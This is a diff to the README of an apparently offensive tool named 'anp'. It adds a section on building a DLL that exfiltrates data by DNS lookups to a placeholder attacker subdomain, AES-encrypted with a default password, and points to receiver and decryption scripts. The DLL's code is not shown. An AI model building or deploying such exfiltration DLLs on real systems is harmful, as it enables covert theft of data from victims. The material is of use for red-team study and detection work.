@@ -102,7 +102,7 @@ This one is not ideal, as the maximum length for a subdomain is 63 characters so
 There is not a default subdomain, you have to set the value using the macro /DSUBDOMAIN:
 
 ```powershell
-cl /LD /DSUBDOMAIN=L\".SUBDOMAIN.DOMAIN.COM\" 5_dns_base64.c crypt32.lib /link /OUT:test.dll
+cl /LD /DSUBDOMAIN=L\".SUBDOMAIN.DOMAIN.COM\" 5_dns_base64.c crypt32.lib /link /OUT:anp.dll
 ```
 
 You can use [this repository](https://github.com/ricardojoserf/dns-exfiltration) for creating the necessary subdomains and the *dns_server.py* script to decode the received values.
@@ -117,7 +117,23 @@ It also generates a log file with the subdomains and decoded values:
 
 ![imgdns2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns2.png)
 
+<br>
 
+## 6. DNS exfiltration + AES-encryption
+
+You have to set the subdomain value using the macro /DSUBDOMAIN, the default AES password is "TEST1234" but you can customize it using /DAES_PWD:
+
+```powershell
+cl /LD /DSUBDOMAIN=L\".SUBDOMAIN.DOMAIN.COM\" /DAES_PWD=\"TEST1234\" 6_dns_aes.c crypt32.lib advapi32.lib /link /OUT:anp.dll
+```
+
+You can use the *dns_server.py* script again to receive resolved domains and store it in a file:
+
+![imgdns3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns3.png)
+
+And the *decrypt_aes.py* script to decrypt the values:
+
+![imgdns4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns4.png)
 
 <br>
 
